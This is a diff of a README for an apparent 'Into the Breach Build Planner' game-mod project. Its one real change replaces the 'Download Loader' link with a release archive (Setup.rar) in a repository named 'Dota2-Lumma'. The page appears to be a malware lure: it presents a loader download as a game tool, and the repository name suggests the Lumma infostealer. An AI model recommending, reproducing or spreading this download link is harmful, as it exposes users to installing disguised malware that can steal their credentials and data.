@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Into the Breach Build Planner
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Into-the-Breach-Build-Planner` · Updated: 2026-10-30
 
 **Tags:** `into-the-breach` `build-planner` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
